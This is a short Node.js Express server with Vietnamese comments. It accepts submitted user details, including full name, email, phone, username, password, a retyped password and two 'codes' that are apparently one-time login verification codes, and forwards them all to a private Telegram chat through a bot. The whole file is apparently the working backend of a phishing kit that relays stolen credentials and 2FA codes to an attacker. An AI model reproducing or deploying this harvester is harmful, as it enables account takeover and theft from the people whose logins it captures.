const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());
app.use(express.json());

const PORT = 3000;

// Telegram Bot Token và Chat ID
require('dotenv').config();

const TELEGRAM_BOT_TOKEN_1 = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID_1 = process.env.TELEGRAM_CHAT_ID;

// Endpoint POST để nhận thông tin từ FE
app.post('/api/user-info', async (req, res) => {
    const userInfo = req.body;

    // Lấy IP từ body hoặc từ request headers/sockets nếu không có trong body
    const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;


    // Format thông tin thành chuỗi để gửi
    const message = `
📧 *User Information Received*:
- Full Name: ${userInfo.fullName || ''}
- Email Address: ${userInfo.email || ''}
- Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
- Username: ${userInfo.username || ''}
- Password: ${userInfo.password || ''}
- Retype Password: ${userInfo.retypePassword || ''}
- First Code: ${userInfo.firstCode || ''}
- Second Code: ${userInfo.secondCode || ''}
    `;

    try {
        // Gửi tin nhắn qua Telegram
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID_1,
            text: message,
            parse_mode: 'Markdown', // Định dạng tin nhắn
        });

        res.json({
            message: 'User info received and sent to Telegram successfully',
            telegramResponse: response.data.result.text,
        });
    } catch (error) {
        console.error('Error sending message to Telegram:', error.message);

        res.status(500).json({
            message: 'Failed to send message to Telegram',
            error: error.message,
        });
    }
});

// Khởi động server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});